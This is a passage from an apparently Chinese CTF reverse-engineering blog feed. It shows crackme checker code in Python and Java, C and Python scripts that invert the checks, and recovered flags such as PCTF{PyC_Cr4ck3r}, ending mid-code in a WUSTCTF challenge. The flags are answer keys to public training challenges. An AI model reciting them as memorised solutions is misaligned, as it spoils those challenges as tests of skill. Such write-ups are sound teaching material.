<span class="number">175</span>, <span class="number">112</span>, <span class="number">172</span>, <span class="number">250</span>, <span class="number">133</span>, <span class="number">130</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">34</span>, <span class="number">157</span>, <span class="number">120</span>, <span class="number">195</span>, <span class="number">45</span>, <span class="number">4</span>, </span><br><span class="line"><span class="number">142</span>, <span class="number">139</span>]</span><br><span class="line">pwda = [<span class="number">188</span>,<span class="number">155</span>,<span class="number">11</span>,<span class="number">58</span>,<span class="number">251</span>,<span class="number">208</span>,<span class="number">204</span>,<span class="number">202</span>,<span class="number">150</span>,<span class="number">120</span>,<span class="number">206</span>,<span class="number">237</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">126</span>,<span class="number">6</span>,<span class="number">42</span>]</span><br><span class="line">pwdb = [<span class="number">53</span>,<span class="number">222</span>,<span class="number">230</span>,<span class="number">35</span>,<span class="number">67</span>,<span class="number">248</span>,<span class="number">226</span>,<span class="number">216</span>,<span class="number">17</span>,<span class="number">209</span>,<span class="number">32</span>,<span class="number">2</span>,<span class="number">181</span>,<span class="number">200</span>,<span class="number">171</span>,<span class="number">60</span>,<span class="number">108</span>]</span><br><span class="line">flag = raw_input(<span class="string">&#x27;Input your Key:&#x27;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">17</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Wrong Key!!&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">flag = flag[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(flag[i]) + pwda[i] &amp; <span class="number">255</span> != lookup[i + pwdb[i]]:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Wrong Key!!&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Congratulations!!&#x27;</span></span><br></pre></td></tr></table></figure><p>这里就是计算+倒序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> a[]=&#123;<span class="number">196</span>,<span class="number">153</span>, <span class="number">149</span>,<span class="number">206</span>, <span class="number">17</span>,<span class="number">221</span>, <span class="number">10</span>, <span class="number">217</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">152</span>, </span><br><span class="line">    <span class="number">21</span>, <span class="number">228</span>, <span class="number">105</span>, <span class="number">191</span>, <span class="number">173</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">245</span>, <span class="number">23</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">246</span>, <span class="number">89</span>, <span class="number">178</span>, <span class="number">182</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">226</span>, </span><br><span class="line">    <span class="number">165</span>, <span class="number">241</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">151</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">169</span>, <span class="number">150</span>, <span class="number">224</span>, <span class="number">69</span>, <span class="number">156</span>, <span class="number">158</span>, <span class="number">57</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">200</span>, <span class="number">37</span>, </span><br><span class="line">    <span class="number">51</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">170</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">202</span>, <span class="number">107</span>, <span class="number">25</span>, <span class="number">73</span>, <span class="number">148</span>, <span class="number">98</span>, <span class="number">129</span>, </span><br><span class="line">    <span class="number">231</span>, <span class="number">212</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">171</span>, <span class="number">64</span>, <span class="number">180</span>, <span class="number">233</span>, <span class="number">74</span>, <span class="number">140</span>, <span class="number">242</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">253</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">86</span>, </span><br><span class="line">    <span class="number">27</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">35</span>, <span class="number">248</span>, <span class="number">96</span>, <span class="number">5</span>, <span class="number">56</span>, <span class="number">20</span>, <span class="number">161</span>, <span class="number">213</span>, <span class="number">238</span>, <span class="number">220</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">247</span>, <span class="number">8</span>, <span class="number">63</span>, <span class="number">249</span>, </span><br><span class="line">    <span class="number">145</span>, <span class="number">243</span>, <span class="number">155</span>, <span class="number">222</span>, <span class="number">122</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">216</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">115</span>, <span class="number">138</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">229</span>, </span><br><span class="line">    <span class="number">204</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">141</span>, <span class="number">159</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">124</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">251</span>, <span class="number">40</span>, </span><br><span class="line">    <span class="number">205</span>, <span class="number">137</span>, <span class="number">199</span>, <span class="number">83</span>, <span class="number">54</span>, <span class="number">188</span>, <span class="number">19</span>, <span class="number">184</span>, <span class="number">201</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">168</span>, <span class="number">154</span>, <span class="number">185</span>, </span><br><span class="line">    <span class="number">183</span>, <span class="number">244</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">210</span>, <span class="number">218</span>, <span class="number">47</span>, <span class="number">163</span>, <span class="number">215</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">237</span>, <span class="number">118</span>, <span class="number">101</span>, </span><br><span class="line">    <span class="number">24</span>, <span class="number">234</span>, <span class="number">106</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">136</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">193</span>, <span class="number">176</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">239</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">192</span>, </span><br><span class="line">    <span class="number">11</span>, <span class="number">70</span>, <span class="number">58</span>, <span class="number">187</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">236</span>, <span class="number">230</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">190</span>, <span class="number">208</span>, <span class="number">207</span>, <span class="number">7</span>, <span class="number">53</span>, <span class="number">219</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">127</span>, </span><br><span class="line">    <span class="number">125</span>, <span class="number">164</span>, <span class="number">179</span>, <span class="number">175</span>, <span class="number">112</span>, <span class="number">172</span>, <span class="number">250</span>, <span class="number">133</span>, <span class="number">130</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">34</span>, <span class="number">157</span>, <span class="number">120</span>, <span class="number">195</span>, <span class="number">45</span>, <span class="number">4</span>, </span><br><span class="line">    <span class="number">142</span>, <span class="number">139</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> b[]=&#123;<span class="number">188</span>,<span class="number">155</span>,<span class="number">11</span>,<span class="number">58</span>,<span class="number">251</span>,<span class="number">208</span>,<span class="number">204</span>,<span class="number">202</span>,<span class="number">150</span>,<span class="number">120</span>,<span class="number">206</span>,<span class="number">237</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">126</span>,<span class="number">6</span>,<span class="number">42</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> c[]=&#123;<span class="number">53</span>,<span class="number">222</span>,<span class="number">230</span>,<span class="number">35</span>,<span class="number">67</span>,<span class="number">248</span>,<span class="number">226</span>,<span class="number">216</span>,<span class="number">17</span>,<span class="number">209</span>,<span class="number">32</span>,<span class="number">2</span>,<span class="number">181</span>,<span class="number">200</span>,<span class="number">171</span>,<span class="number">60</span>,<span class="number">108</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">17</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i]=a[i + c[i]]-b[i] &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">16</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面这个是python的，比用C语言写简单多了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lookup = [<span class="number">196</span>,<span class="number">153</span>, <span class="number">149</span>,<span class="number">206</span>, <span class="number">17</span>,<span class="number">221</span>, <span class="number">10</span>, <span class="number">217</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">152</span>, </span><br><span class="line"><span class="number">21</span>, <span class="number">228</span>, <span class="number">105</span>, <span class="number">191</span>, <span class="number">173</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">245</span>, <span class="number">23</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">246</span>, <span class="number">89</span>, <span class="number">178</span>, <span class="number">182</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">226</span>, </span><br><span class="line"><span class="number">165</span>, <span class="number">241</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">151</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">169</span>, <span class="number">150</span>, <span class="number">224</span>, <span class="number">69</span>, <span class="number">156</span>, <span class="number">158</span>, <span class="number">57</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">200</span>, <span class="number">37</span>, </span><br><span class="line"><span class="number">51</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">170</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">202</span>, <span class="number">107</span>, <span class="number">25</span>, <span class="number">73</span>, <span class="number">148</span>, <span class="number">98</span>, <span class="number">129</span>, </span><br><span class="line"><span class="number">231</span>, <span class="number">212</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">171</span>, <span class="number">64</span>, <span class="number">180</span>, <span class="number">233</span>, <span class="number">74</span>, <span class="number">140</span>, <span class="number">242</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">253</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">86</span>, </span><br><span class="line"><span class="number">27</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">35</span>, <span class="number">248</span>, <span class="number">96</span>, <span class="number">5</span>, <span class="number">56</span>, <span class="number">20</span>, <span class="number">161</span>, <span class="number">213</span>, <span class="number">238</span>, <span class="number">220</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">247</span>, <span class="number">8</span>, <span class="number">63</span>, <span class="number">249</span>, </span><br><span class="line"><span class="number">145</span>, <span class="number">243</span>, <span class="number">155</span>, <span class="number">222</span>, <span class="number">122</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">216</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">115</span>, <span class="number">138</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">229</span>, </span><br><span class="line"><span class="number">204</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">141</span>, <span class="number">159</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">124</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">251</span>, <span class="number">40</span>, </span><br><span class="line"><span class="number">205</span>, <span class="number">137</span>, <span class="number">199</span>, <span class="number">83</span>, <span class="number">54</span>, <span class="number">188</span>, <span class="number">19</span>, <span class="number">184</span>, <span class="number">201</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">168</span>, <span class="number">154</span>, <span class="number">185</span>, </span><br><span class="line"><span class="number">183</span>, <span class="number">244</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">210</span>, <span class="number">218</span>, <span class="number">47</span>, <span class="number">163</span>, <span class="number">215</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">237</span>, <span class="number">118</span>, <span class="number">101</span>, </span><br><span class="line"><span class="number">24</span>, <span class="number">234</span>, <span class="number">106</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">136</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">193</span>, <span class="number">176</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">239</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">192</span>, </span><br><span class="line"><span class="number">11</span>, <span class="number">70</span>, <span class="number">58</span>, <span class="number">187</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">236</span>, <span class="number">230</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">190</span>, <span class="number">208</span>, <span class="number">207</span>, <span class="number">7</span>, <span class="number">53</span>, <span class="number">219</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">127</span>, </span><br><span class="line"><span class="number">125</span>, <span class="number">164</span>, <span class="number">179</span>, <span class="number">175</span>, <span class="number">112</span>, <span class="number">172</span>, <span class="number">250</span>, <span class="number">133</span>, <span class="number">130</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">34</span>, <span class="number">157</span>, <span class="number">120</span>, <span class="number">195</span>, <span class="number">45</span>, <span class="number">4</span>, </span><br><span class="line"><span class="number">142</span>, <span class="number">139</span>]</span><br><span class="line">pwda = [<span class="number">188</span>,<span class="number">155</span>,<span class="number">11</span>,<span class="number">58</span>,<span class="number">251</span>,<span class="number">208</span>,<span class="number">204</span>,<span class="number">202</span>,<span class="number">150</span>,<span class="number">120</span>,<span class="number">206</span>,<span class="number">237</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">126</span>,<span class="number">6</span>,<span class="number">42</span>]</span><br><span class="line">pwdb = [<span class="number">53</span>,<span class="number">222</span>,<span class="number">230</span>,<span class="number">35</span>,<span class="number">67</span>,<span class="number">248</span>,<span class="number">226</span>,<span class="number">216</span>,<span class="number">17</span>,<span class="number">209</span>,<span class="number">32</span>,<span class="number">2</span>,<span class="number">181</span>,<span class="number">200</span>,<span class="number">171</span>,<span class="number">60</span>,<span class="number">108</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(lookup[i + pwdb[i]]-pwda[i] &amp; <span class="number">255</span>)</span><br><span class="line">flag=flag[::<span class="number">-1</span>]</span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><blockquote><p>PCTF{PyC_Cr4ck3r}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java逆向</title>
      <link href="/2021/03/03/java%E9%80%86%E5%90%91/"/>
      <url>/2021/03/03/java%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">      System.out.println(<span class="string">&quot;Please input the flag 锛�&quot;</span>);</span><br><span class="line">      String str = s.next();</span><br><span class="line">      System.out.println(<span class="string">&quot;Your input is 锛�&quot;</span>);</span><br><span class="line">      System.out.println(str);</span><br><span class="line">      <span class="keyword">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">      Encrypt(stringArr);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span>[] arr)</span> </span>&#123;</span><br><span class="line">      ArrayList Resultlist = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> KEY = <span class="number">0</span>; KEY &lt; arr.length; ++KEY) &#123;</span><br><span class="line">         <span class="keyword">int</span> KEYList = arr[KEY] + <span class="number">64</span> ^ <span class="number">32</span>;</span><br><span class="line">         Resultlist.add(Integer.valueOf(KEYList));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span>[] var5 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, </span><br><span class="line">         <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">      ArrayList var6 = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; var5.length; ++j) &#123;</span><br><span class="line">         var6.add(Integer.valueOf(var5[j]));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(Resultlist.equals(var6)) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Congratulations锛�&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         System.err.println(<span class="string">&quot;Error锛�&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很清晰的逻辑，直接写脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">18</span>]=&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, </span><br><span class="line">      <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">18</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    a[i]=a[i]<span class="number">-64</span> ^ <span class="number">32</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{This_is_the_flag_!}</p></blockquote><h1 id="Wust"><a href="#Wust" class="headerlink" title="Wust"></a>Wust</h1><p><a href="https://pan.baidu.com/s/11OVxyzhLx9z0A1pMTdYLxw">附件链接</a> 提取码：0000</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wust</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;WUSTCTF2021 Freshman competition&quot;</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line">      BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line">      String str = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">int</span>[] flag = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">60</span>, <span class="number">23</span>, <span class="number">23</span>, <span class="number">41</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">17</span>, <span class="number">126</span>, <span class="number">68</span>, <span class="number">43</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">71</span>, <span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         str = br.readLine();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;ERROR: Undefined Exception.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(str.isEmpty()) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Nothing received.&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">if</span>(str.length() != <span class="number">22</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;len Wrong!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         String head = str.substring(<span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">         <span class="keyword">if</span>(!head.equals(<span class="string">&quot;flag&#123;&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;head Wrong!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         String m = str.substring(<span class="number">5</span>, str.length() - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">char</span> a = m.charAt(i);</span><br><span class="line">            <span class="keyword">char</span> b = m.charAt(i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">int</span> c = a ^ b;</span><br><span class="line">            <span class="keyword">if</span>(c != flag[i]) &#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   